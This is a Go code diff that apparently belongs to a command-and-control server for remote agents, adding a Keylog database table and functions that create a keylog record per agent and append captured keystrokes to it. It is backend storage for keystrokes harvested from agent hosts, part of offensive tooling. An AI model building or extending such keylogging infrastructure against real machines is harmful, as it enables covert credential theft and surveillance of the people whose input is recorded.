@@ -66,6 +66,22 @@ func InitDatabase() {
 	}
 	CommandSQLstatement.Exec()
 	logger.Logf(logger.Info, "Commands table created\n")
+
+	KeylogSQL := `
+	CREATE TABLE IF NOT EXISTS "Keylog" (
+		"KeylogID"	INTEGER NOT NULL UNIQUE,
+		"UUID"	TEXT,
+		"Keys"	TEXT,
+		PRIMARY KEY("KeylogID" AUTOINCREMENT),
+		FOREIGN KEY("UUID") REFERENCES "Agents"("UUID")
+	);
+	`
+	KeylogSQLstatement, err := db.Prepare(KeylogSQL)
+	if err != nil {
+		log.Fatal(err.Error())
+	}
+	KeylogSQLstatement.Exec()
+	logger.Logf(logger.Info, "Keylog table created\n")
 }
 
 func CreateAgent(uuid string, CallBackToIP string, CallBackFeq string, CallBackJitter string, Ip string, User string, Hostname string) {
@@ -85,6 +101,25 @@ func CreateAgent(uuid string, CallBackToIP string, CallBackFeq string, CallBackJ
 		log.Fatalln(err)
 	}
 	logger.Logf(logger.Info, "New Agent created in DB\n")
+}
+
+func CreateKeys(uuid string) {
+	CreateKeysSQL := `INSERT INTO Keylog (UUID, Keys)
+	VALUES (?, ?)`
+
+	statement, err := db.Prepare(CreateKeysSQL)
+	if err != nil {
+
+		log.Fatalln(err)
+		logger.Logf(logger.Info, "Error in DB\n")
+	}
+
+	_, err = statement.Exec(uuid, "")
+	if err != nil {
+
+		log.Fatalln(err)
+	}
+	logger.Logf(logger.Info, "New Keylog Agent created in DB\n")
 }
 
 func FetchOneAgent(uuid string) types.ConfigAgent {
@@ -191,6 +226,24 @@ func UpdateAgentCommand(CommandUUID string, Output string, uuid string) {
 		log.Fatalln(err)
 	}
 	logger.Logf(logger.Info, "Agent %s Reveived Output with CommandID %s \n", uuid, CommandUUID)
+}
+
+func UpdateAgentKeys(UUID string, Keys string) {
+	updateAgentKeylogSQL := `UPDATE Keylog SET Keys=Keys || ? WHERE UUID= ?`
+
+	statement, err := db.Prepare(updateAgentKeylogSQL)
+	if err != nil {
+
+		log.Fatalln(err)
+		logger.Logf(logger.Info, "Error in DB\n")
+	}
+
+	_, err = statement.Exec(Keys, UUID)
+	if err != nil {
+
+		log.Fatalln(err)
+	}
+	// logger.Logf(logger.Info, "Agent %s Reveived Output with CommandID %s \n", uuid, CommandUUID)
 }
 
 // WEB Functions
